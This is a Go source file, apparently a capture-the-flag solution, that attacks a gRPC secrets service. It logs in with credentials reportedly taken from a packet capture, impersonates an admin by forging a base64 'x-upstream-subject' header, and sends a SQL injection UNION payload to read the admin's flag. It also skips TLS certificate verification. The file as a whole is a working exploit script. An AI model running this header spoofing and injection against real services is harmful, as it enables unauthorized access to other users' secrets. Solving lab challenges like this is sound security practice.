package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	pb "grpc-chall/proto"
	"log"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

// Helper to login and get JWT token
func login(client pb.SecretsServiceClient, username, password string) string {
	ctx := context.Background()
	resp, err := client.Login(ctx, &pb.LoginRequest{
		Username: username,
		Password: password,
	})
	if err != nil {
		fmt.Printf("login failed for %s: %v", username, err)
		return ""
	}
	fmt.Printf("Logged in as %s\n", username)
	return resp.Token
}

// Helper to create authenticated context with JWT
func authContext(token string) context.Context {
	ctx := context.Background()
	md := metadata.Pairs("authorization", "Bearer "+token)
	return metadata.NewOutgoingContext(ctx, md)
}

// Helper to add base64-encoded x-upstream-subject to context
// The header format is: base64(username + "|" + random_padding)
func addUpstreamSubject(ctx context.Context, subject string) context.Context {
	md, ok := metadata.FromOutgoingContext(ctx)
	if !ok {
		md = metadata.MD{}
	}
	padding := make([]byte, 16)
	for i := range padding {
		padding[i] = byte('a' + (i*7)%26)
	}
	paddedSubject := subject + "|" + fmt.Sprintf("%x", padding)
	encoded := base64.StdEncoding.EncodeToString([]byte(paddedSubject))
	newMD := metadata.Join(md, metadata.Pairs("x-upstream-subject", encoded))
	return metadata.NewOutgoingContext(ctx, newMD)
}

func createClientConnection(addr string, useTLS bool) (*grpc.ClientConn, error) {
	var dialOpts grpc.DialOption

	if useTLS {
		tlsCfg := &tls.Config{
			InsecureSkipVerify: true,
		}
		creds := credentials.NewTLS(tlsCfg)
		dialOpts = grpc.WithTransportCredentials(creds)
	} else {
		dialOpts = grpc.WithTransportCredentials(insecure.NewCredentials())
	}
	conn, err := grpc.NewClient(addr, dialOpts)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to %s: %w", addr, err)
	}
	return conn, nil
}

func main() {
	var (
		addr  = flag.String("target", "localhost:50051", "gRPC target (host:port)")
		noTLS = flag.Bool("notls", false, "disable TLS")
	)
	flag.Parse()
	*noTLS = !*noTLS
	const (
		username_found = "alice"
		password_found = "YWI4NmEyMTdiYmJmMDZjZGYxYjg2MWVhMGM0MGJjYjdkMTJjZmQ3NjRiYWVhZTkzZTJlOTI2ZGE2ZTAxMjM5MAo"
	)
	conn, err := createClientConnection(*addr, *noTLS)
	if err != nil {
		log.Fatalf("failed to connect: %v", err)
	}
	defer conn.Close()

	client := pb.NewSecretsServiceClient(conn)

	// Step 1: login as Alice (we can use any valid user we encounter on the pcap, eg. alice bob etc)
	alice_token := login(client, username_found, password_found)
	if alice_token == "" {
		log.Fatalf("failed to login as alice")
	}
	ctx := authContext(alice_token)

	// Step 2: Verify we can access Alice's own resource normally
	resources, err := client.ListDocs(ctx, &pb.ListRequest{})
	if err != nil {
		log.Fatalf("failed to list alice's resources: %v", err)
	}
	fmt.Printf("Alice has %d resources\n", len(resources.Items))
	random_resource := resources.Items[0].Id
	fmt.Printf("Accessing Alice's resource ID: %s\n", random_resource)
	res, err := client.GetSecret(ctx, &pb.GetSecretRequest{ResourceId: random_resource})
	if err != nil {
		fmt.Printf("Failed to get Alice's resource: %v\n", err)
	} else {
		fmt.Printf("Alice's resource: %s\n", res.Secret)
	}

	// Step 3: list the docs owned by admin using the strange x-upstream-subject header
	fmt.Println("Listing admin's resources...")
	ctx_admin := addUpstreamSubject(ctx, "admin")
	admin_resources, err := client.ListDocs(ctx_admin, &pb.ListRequest{})
	if err != nil {
		fmt.Printf("Failed to list admin's resources: %v\n", err)
	} else {
		fmt.Printf("Admin has %d resources:\n", len(admin_resources.Items))
		for _, res := range admin_resources.Items {
			fmt.Printf(" - %s\n", res.Id)
		}
	}
	// we notice the target resource from here
	const target_resource = "admin-flag-store"
	payload := "nonexistent' UNION SELECT 'alice', secret, strftime('%s', created_at) FROM resources WHERE id='admin-flag-store' -- "
	res, err = client.GetSecret(ctx, &pb.GetSecretRequest{ResourceId: payload})
	if err != nil {
		fmt.Printf("Payload failed (expected): %v\n", err)
	} else {
		fmt.Printf("Payload SUCCESS! FLAG: %s\n", res.Secret)
	}

}
